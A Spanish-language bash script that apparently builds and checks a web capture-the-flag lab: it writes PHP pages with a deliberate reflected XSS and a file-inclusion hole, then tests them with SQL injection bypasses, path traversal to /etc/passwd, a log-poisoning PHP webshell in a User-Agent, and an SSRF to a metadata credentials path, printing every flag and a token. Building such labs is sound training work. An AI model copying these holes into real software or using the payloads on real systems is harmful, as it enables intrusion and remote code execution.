#!/bin/bash
# =============================================================================
# CTF MGP — SOLUCIÓN DEFINITIVA
# XSS se mueve a puerto 80, path /xss/ — igual que todos los demás retos
# No más VirtualHosts. URL: http://192.168.125.150/xss/
# LFI: fix open_basedir vía php.ini
# =============================================================================

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root${RESET}"; exit 1; }

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — XSS puerto 80 + LFI fix                         ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3")

# =============================================================================
# PASO 1: Deshabilitar VirtualHost :8181 para siempre
# =============================================================================
echo -e "${AMARILLO}[1] Eliminando VirtualHost :8181...${RESET}"

a2dissite xss-ctf.conf 2>/dev/null || true
sed -i '/^Listen 8181/d' /etc/apache2/ports.conf
rm -f /etc/apache2/sites-enabled/xss-ctf.conf
echo -e "${VERDE}    [OK] VirtualHost :8181 eliminado${RESET}"

# =============================================================================
# PASO 2: XSS en /var/www/html/xss/ bajo puerto 80
# Los archivos ya existen — solo verificamos y corregimos permisos
# =============================================================================
echo ""
echo -e "${AMARILLO}[2] XSS en http://192.168.125.150/xss/ (puerto 80)...${RESET}"

mkdir -p /var/www/html/xss

# Asegurar AllowOverride en el VirtualHost default para que /xss/ sea accesible
cat > /etc/apache2/sites-available/000-default.conf <<'APACHEEOF'
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog  ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
APACHEEOF

echo -e "${VERDE}    [OK] VirtualHost :80 con AllowOverride All${RESET}"

# Escribir archivos XSS frescos
cat > /var/www/html/xss/index.php <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Fast-Ship Rastreo</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:16px}
header h1{font-size:22px;font-weight:700}
header span{font-size:12px;color:#a0aec0}
.hero{background:#16213e;color:#fff;padding:60px 40px;text-align:center}
.hero h2{font-size:28px;margin-bottom:12px}
.hero p{color:#a0aec0;margin-bottom:28px}
.search-box{display:flex;max-width:500px;margin:0 auto}
.search-box input{flex:1;padding:13px 16px;border:none;border-radius:8px 0 0 8px;font-size:14px;outline:none}
.search-box button{padding:13px 22px;background:#e94560;color:#fff;border:none;border-radius:0 8px 8px 0;cursor:pointer;font-weight:600}
footer{text-align:center;padding:18px;color:#a0aec0;font-size:12px;border-top:1px solid #e2e8f0}
</style>
</head>
<body>
<header><div><h1>Fast-Ship</h1><span>Logistica y Rastreo Internacional</span></div></header>
<div class="hero">
  <h2>Rastrea tu paquete en tiempo real</h2>
  <p>Ingresa el numero de guia o nombre del remitente</p>
  <form class="search-box" action="search.php" method="GET">
    <input type="text" name="query" placeholder="Numero de guia...">
    <button type="submit">Buscar</button>
  </form>
</div>
<footer>Fast-Ship Logistics 2026</footer>
</body>
</html>
PHPEOF

cat > /var/www/html/xss/search.php <<'PHPEOF'
<?php
header("Set-Cookie: session_flag=Comciberdef{xss_reflected_2026_found}; path=/");
$query = $_GET['query'] ?? '';
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Fast-Ship Resultados</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:20px;font-weight:700}
.container{max-width:700px;margin:40px auto;padding:0 20px}
.box{background:#fff;border-radius:10px;padding:28px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
.box h2{font-size:17px;margin-bottom:8px}
.echo{background:#edf2f7;border-left:4px solid #e94560;padding:12px 16px;margin:14px 0}
.msg{color:#718096;font-size:14px;margin-top:12px}
.back{display:inline-block;margin-top:20px;color:#e94560;font-size:14px;text-decoration:none}
</style>
</head>
<body>
<header>
  <h1>Fast-Ship</h1>
  <a href="index.php" style="color:#a0aec0;font-size:13px;text-decoration:none">Volver</a>
</header>
<div class="container">
  <div class="box">
    <h2>Resultados de busqueda</h2>
    <p style="font-size:13px;color:#718096">Buscaste:</p>
    <div class="echo"><?php echo $query; ?></div>
    <div class="msg">No se encontraron resultados.</div>
    <a class="back" href="index.php">Nueva busqueda</a>
  </div>
</div>
</body>
</html>
PHPEOF

chown -R www-data:www-data /var/www/html/xss
chmod 755 /var/www/html/xss
chmod 644 /var/www/html/xss/*.php
echo -e "${VERDE}    [OK] Archivos XSS escritos en /var/www/html/xss/${RESET}"

# =============================================================================
# PASO 3: LFI — vaciar open_basedir en php.ini de Apache
# =============================================================================
echo ""
echo -e "${AMARILLO}[3] Vaciando open_basedir...${RESET}"

PHP_INI="/etc/php/${PHP_VER}/apache2/php.ini"
if [ -f "$PHP_INI" ]; then
    sed -i 's|^open_basedir\s*=.*|open_basedir =|' "$PHP_INI"
    echo -e "${VERDE}    [OK] $(grep '^open_basedir' "$PHP_INI")${RESET}"
fi

# Reescribir LFI index.php
tee /var/www/html/lfi/index.php > /dev/null <<'PHPEOF'
<?php
ini_set('open_basedir', '');
ini_set('display_errors', 0);

$log_file = '/var/log/app/access.log';
$ip   = $_SERVER['REMOTE_ADDR']     ?? '0.0.0.0';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$uri  = $_SERVER['REQUEST_URI']     ?? '/';
$page = $_GET['page']               ?? '';
$ts   = date('Y-m-d H:i:s');

$entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
@file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);

if ($page !== '') { @include($page); }
?><!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>COMCIBERDEF Log Viewer v2.3.1</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#c9d1d9;font-family:sans-serif;min-height:100vh}
header{background:#16213e;border-bottom:2px solid #0f3460;padding:14px 32px;display:flex;align-items:center;gap:16px}
header h1{font-size:17px;color:#e94560;font-weight:700}
header span{font-size:11px;color:#718096;margin-left:auto}
.layout{display:flex;min-height:calc(100vh - 52px)}
.sidebar{width:200px;background:#16213e;border-right:1px solid #0f3460;padding:18px}
.sidebar h3{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#718096;margin-bottom:10px}
.sidebar a{display:block;padding:8px 10px;border-radius:5px;color:#a0aec0;font-size:13px;text-decoration:none;margin-bottom:3px}
.sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
.main{flex:1;padding:24px}
.content-area{background:#16213e;border:1px solid #0f3460;border-radius:8px;padding:24px;line-height:1.7}
.content-area h2{color:#e94560;margin-bottom:12px;font-size:17px}
.content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
.content-area code{background:#0f3460;padding:2px 5px;border-radius:3px;font-family:monospace;color:#63b3ed;font-size:12px}
.meta{font-size:11px;color:#4a5568;margin-top:20px;padding-top:10px;border-top:1px solid #0f3460}
</style>
</head>
<body>
<header>
  <h1>COMCIBERDEF Log Viewer v2.3.1</h1>
  <span>SISTEMA INTERNO</span>
</header>
<div class="layout">
  <div class="sidebar">
    <h3>Navegacion</h3>
    <a href="?page=pages/home.php"    class="<?=($page==='pages/home.php')?'active':''?>">Inicio</a>
    <a href="?page=pages/news.php"    class="<?=($page==='pages/news.php')?'active':''?>">Novedades</a>
    <a href="?page=pages/contact.php" class="<?=($page==='pages/contact.php')?'active':''?>">Soporte</a>
    <div style="margin-top:20px;padding-top:14px;border-top:1px solid #0f3460">
      <h3>Sistema</h3>
      <a href="?page=pages/home.php">Ver Logs</a>
    </div>
  </div>
  <div class="main">
    <?php if($page===''): ?>
    <div class="content-area">
      <h2>Bienvenido</h2>
      <p>Selecciona del menu o usa <code>?page=</code></p>
      <p style="margin-top:10px">Logs en: <code>/var/log/app/access.log</code></p>
    </div>
    <?php endif; ?>
    <div class="meta">Log: <?=htmlspecialchars($log_file)?> | IP: <?=htmlspecialchars($ip)?></div>
  </div>
</div>
</body>
</html>
PHPEOF

chown www-data:www-data /var/www/html/lfi/index.php
echo -e "${VERDE}    [OK] LFI index.php reescrito${RESET}"

# =============================================================================
# REINICIAR APACHE
# =============================================================================
echo ""
echo -e "${AMARILLO}[4] Reiniciando Apache...${RESET}"
apache2ctl configtest 2>&1 | grep -q "Syntax OK" && \
    systemctl restart apache2 && sleep 2 && \
    echo -e "${VERDE}    [OK] Apache reiniciado${RESET}" || \
    { apache2ctl configtest 2>&1; exit 1; }

echo -e "    VirtualHosts activos:"
apache2ctl -S 2>&1 | grep "namevhost\|port" | head -5 || true

# =============================================================================
# VALIDACIÓN FINAL
# =============================================================================
echo ""
echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║               VALIDACIÓN FINAL                              ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }
chk_http() {
    local C; C=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$C" = "$3" ] && ok "$1 (HTTP $C)" || fail "$1 (esperado $3, got $C)"
}
chk_body() {
    local B; B=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$B" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── Reto 1: SQLi Login ──────────────────────────────${RESET}"
chk_http "/sqli-login/" "http://localhost/sqli-login/" "200"
B=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null)
echo "$B" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && \
    ok "SQLi bypass → flag" || fail "SQLi bypass"

echo ""
echo -e "${AMARILLO}── Reto 2: XSS (puerto 80, /xss/) ─────────────────${RESET}"
chk_http "/xss/ accesible"    "http://localhost/xss/"                           "200"
chk_http "search.php responde" "http://localhost/xss/search.php?query=test"     "200"
chk_body "Refleja input"       "http://localhost/xss/search.php?query=CTF2026"  "CTF2026"
HDRS=$(curl -sI "http://localhost/xss/search.php?query=x" 2>/dev/null || echo "")
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && \
    ok "Cookie session_flag presente" || fail "Cookie session_flag ausente"

echo ""
echo -e "${AMARILLO}── Reto 3: SQLi Ciega ───────────────────────────────${RESET}"
chk_http "/sqli-blind/" "http://localhost/sqli-blind/" "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"
HASH=$(mysql -u root -e \
    "SELECT password_hash FROM blind_db.moderators WHERE username='paco_admin';" \
    -sN 2>/dev/null || echo "X")
EXP=$(echo -n "NavalCiber2026" | md5sum | cut -d' ' -f1)
[ "$HASH" = "$EXP" ] && ok "Hash MD5 paco_admin correcto" || \
    fail "Hash MD5 incorrecto ($HASH)"

echo ""
echo -e "${AMARILLO}── Reto 4: LFI + Log Poisoning ──────────────────────${RESET}"
chk_http "/lfi/" "http://localhost/lfi/" "200"
chk_body "LFI lee /etc/passwd" \
    "http://localhost/lfi/?page=../../../etc/passwd" "root:x"
[ -f /flag.txt ] && ok "/flag.txt existe" || fail "/flag.txt no existe"
curl -s -A '<?php system($_GET["cmd"]); ?>' \
    "http://localhost/lfi/?page=pages/home.php" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" "Comciberdef"
printf '[2026-01-15 08:00:00] 192.168.125.40 GET /lfi/ "Mozilla/5.0" 200\n' \
    > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── Reto 5: SSRF ─────────────────────────────────────${RESET}"
[ "$(systemctl is-active ctf-metadata 2>/dev/null)" = "active" ] && \
    ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
[ "$(systemctl is-active ctf-storage 2>/dev/null)" = "active" ] && \
    ok "ctf-storage activo" || fail "ctf-storage inactivo"
TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
F=$(curl -s -H "Authorization: Bearer $TOKEN" \
    "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null)
echo "$F" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && \
    ok "Storage entrega flag" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
    "Token"
chk_http "/ssrf/" "http://localhost/ssrf/" "200"

# RESUMEN
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles pasados\n${RESET}" "$PASS" "$TOTAL"
[ "$FAIL" -eq 0 ] && \
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB LISTOS PARA EL CTF${RESET}" || \
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL fallaron${RESET}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${NEGRITA}  URLs DEFINITIVAS participantes:${RESET}"
echo "  R1 → http://192.168.125.150/sqli-login/  │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150/xss/         │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/  │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/         │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/        │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AMARILLO}  Nota: Reto 2 XSS ahora en puerto 80 (mismo que el resto)${RESET}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
